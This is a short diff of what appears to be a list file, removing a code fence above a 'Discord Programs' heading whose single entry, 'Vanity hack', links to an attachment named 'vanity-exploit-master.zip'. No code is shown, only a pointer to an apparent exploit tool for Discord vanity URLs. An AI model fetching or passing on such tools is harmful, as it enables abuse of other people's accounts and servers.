@@ -1,5 +1,3 @@
-```
-
 ## Discord Programs
 
 - Vanity hack :: https://cdn.discordapp.com/attachments/785327015611858954/785327867801763840/vanity-exploit-master.zip
